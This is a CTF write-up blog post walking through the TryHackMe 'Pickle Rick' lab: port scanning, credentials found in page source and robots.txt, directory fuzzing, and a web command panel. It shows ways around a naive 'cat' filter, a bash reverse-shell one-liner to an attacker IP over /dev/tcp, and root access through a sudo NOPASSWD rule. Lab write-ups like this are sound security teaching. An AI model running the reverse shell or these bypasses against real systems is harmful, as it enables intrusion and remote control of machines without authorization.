---
toc: true
comments: true
title: TryHackMe - Pickle Rick
layout: post
title: TryHackMe - Pickle Rick
date: 2024-08-02 18:28 -0300
categories: [TryHackMe, Easy, CTF]
tags: [Linux, Web, Command Injection, Source Code, Sudo, PrivEsc]    
image: /assets/Posts/PickleRick/logo.png
---

## Pre
- We finish the roadmap where a lot of people *start* their hacking journey: Pickle Rick, a light, funny THM room that teaches the single most important web-recon habit – **read the source code and the obvious files**.
- It's a great palate cleanser after the Active Directory marathon, and it echoes the command-execution-via-web idea from my [RootMe writeup](/posts/tryhackme-rootme/).
- Wubba lubba dub dub.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 22,80 -T4 -sSCV -A -oN nmap/versions $IP
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
```

A web box. Rick needs our help turning himself back from a pickle, and he's left clues everywhere.

## Phase 2: The clues (source + files)
First habit: **view the page source.** Right there in an HTML comment is half a credential:

```html
<!-- Note to self, remember username! Username: R1ckRul3s -->
```

Second habit: **check the boring files** – `robots.txt` and any wordlist-findable paths:

```shell
$ curl http://$IP/robots.txt
Wubbalubbadubdub
```

That odd string is almost certainly the password. And a quick fuzz finds the login portal:

```shell
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
/login.php            (Status: 200)
/portal.php           (Status: 302)
/assets               (Status: 301)
```

We log in at `/login.php` with `R1ckRul3s : Wubbalubbadubdub`.

> Half the "hacking" on beginner web boxes is just reading what the developer left behind: HTML comments, `robots.txt`, `.git` folders, backup files. Always look before you brute-force.
{: .prompt-tip }

## Phase 3: The Command Panel
Login lands us on a **Command Panel** that runs commands on the server and prints the output – effectively a built-in webshell running as `www-data`. First ingredient, please:

```shell
ls -la
Sup3rS3cretPickl3Ingred.txt
clue.txt
```

We try to read the ingredient file, but `cat` is filtered by the app (a naive blacklist). No problem – there are a dozen ways to read a file. Any of these bypasses it:

```shell
less Sup3rS3cretPickl3Ingred.txt
# or: grep -v xyz Sup3rS3cretPickl3Ingred.txt
# or: head -n 100 Sup3rS3cretPickl3Ingred.txt
```

That's the **first ingredient**. To make life easier (the panel is clunky) we can also send ourselves a reverse shell from here:

```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'
```

## Phase 4: Privilege Escalation
As always, the first escalation check is `sudo -l`:

```shell
www-data@picklerick:/$ sudo -l
User www-data may run the following commands on picklerick:
    (ALL) NOPASSWD: ALL
```

`www-data` can run **anything** as root with no password – the escalation is essentially a formality. The remaining two ingredients live in the second user's home and in `/root`:

```shell
www-data@picklerick:/$ sudo ls /home/rick
second ingredients
www-data@picklerick:/$ sudo cat "/home/rick/second ingredients"
www-data@picklerick:/$ sudo cat /root/3rd.txt
```

Three ingredients collected, Rick is un-pickled, and we're effectively root the whole time thanks to that `sudo` rule.

## Conclusions
- Pickle Rick is deliberately gentle, but its lessons are foundational: read the source and the obvious files, expect naive filters (and know several ways around them), and always run `sudo -l`.
- The `(ALL) NOPASSWD: ALL` misconfiguration is the most catastrophic sudoers mistake there is – and you'll be surprised how often something close to it appears in the wild.
- This closes out the roadmap. From the SMB one-shots of [Lame](/posts/hackthebox-lame/) and [Legacy](/posts/hackthebox-legacy/), through web injection, credential chains and a full Active Directory kill chain – hopefully the collection works as a progressive learning path rather than fifteen isolated writeups.

_Keep hacking_  🙈🙉🙊
